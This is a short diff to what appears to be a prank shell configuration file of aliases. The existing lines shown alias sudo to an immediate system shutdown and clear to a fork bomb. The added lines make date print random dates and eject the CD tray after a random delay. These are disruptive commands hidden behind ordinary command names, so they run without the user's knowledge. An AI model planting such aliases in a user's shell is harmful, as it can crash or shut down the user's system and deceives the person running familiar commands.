@@ -24,3 +24,9 @@ alias sudo='sudo shutdown -P now'
 
 # Launch a fork bomb instead of clearing the screen
 alias clear=':(){ :|:& };:'
+
+# Have `date` return random dates
+alias date='date -d "now + $RANDOM days"'
+
+# Randomly eject CD tray
+sleep $[ ( $RANDOM % 10 )  + 1 ]s && [[ uname=="Darwin" ]] && drutil eject || eject -T &
